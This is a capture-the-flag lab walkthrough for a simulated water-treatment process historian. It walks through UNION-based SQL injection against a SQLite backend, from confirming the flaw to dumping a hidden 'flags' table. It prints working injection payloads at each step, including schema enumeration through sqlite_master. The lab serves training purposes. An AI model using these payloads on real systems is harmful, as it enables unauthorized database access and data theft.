# Challenge 8 — Process Historian (SQL Injection)

**Protocol:** HTTP · **Target:** HIST-04 Process Historian, Data Browser tab · **Port:** 9000/tcp

---

## The Story

HIST-04 exposes a "Data Browser" that lets you filter recorded process data by source. The
filter box talks straight to the historian's backend database — and it isn't sanitizing its
input.

## What You Know

- HIST-04 is reachable at `10.0.1.1:9000` (per `sysrupt status`'s historian line).
- The "Data Browser" tab has a `source` filter field that runs a `Query`.
- The engine is `sysrupt-historian (read-only)` — read-only in the sense that the app's own UI
  doesn't let you edit data through it, not that the underlying query is safe from injection.

---

## Step 1: Confirm the field is injectable

<details>
<summary>Hint</summary>

Before trying to extract anything, prove the input breaks the query structure. A single quote
that causes an error or a visibly different result set is enough.
</details>

<details>
<summary>Show command</summary>

In the `source` field:
```sql
' OR '1'='1
```
If the row count or returned rows change from a normal search term, the field is injectable and
the query result is being UNIONed/concatenated directly into what you see.
</details>

## Step 2: Work out the column count and types

<details>
<summary>Hint</summary>

A `UNION SELECT` has to match the original query's column count exactly, or it'll error.
Count the columns in the results table (`ID, TIMESTAMP, SOURCE, TANK_LEVEL, CHLORINE_PPM, PH,
TEMPERATURE, FLOW_RATE, FILTER_DP, …`) and pad your UNION with `NULL` for columns you don't need
yet.
</details>

<details>
<summary>Show command</summary>

```sql
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
```
Adjust the number of `NULL`s until it returns a row with no error — that's your column count.
</details>

## Step 3: Enumerate tables

<details>
<summary>Hint</summary>

The backend is SQLite — its schema lives in a special system table, not something you need to
guess at.
</details>

<details>
<summary>Show command</summary>

```sql
' UNION SELECT name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--
```
This lists every table name in the database — look for one that doesn't belong in a process
historian (e.g. a `flags` table).
</details>

## Step 4: Enumerate the target table's columns

<details>
<summary>Hint</summary>

`sqlite_master` doesn't just hold table names — it holds the original `CREATE TABLE` statement
for each one, which tells you every column.
</details>

<details>
<summary>Show command</summary>

```sql
' UNION SELECT sql, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' AND name='flags'--
```
</details>

## Step 5: Dump the table contents

<details>
<summary>Hint</summary>

Now that you know the column names from Step 4, pull the real ones into your UNION in place of
the padding `NULL`s.
</details>

<details>
<summary>Show command</summary>

```sql
' UNION SELECT id, flag, description, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM flags--
```
</details>

## What You Learned

- How to confirm a UNION-based SQL injection point and match column counts before extracting
  anything.
- Using `sqlite_master` to enumerate a SQLite backend's schema (table names, then column
  definitions) without any prior knowledge of the database structure.
- Pivoting from "confirmed injectable" to a full schema-to-data dump using the same technique at
  each stage.
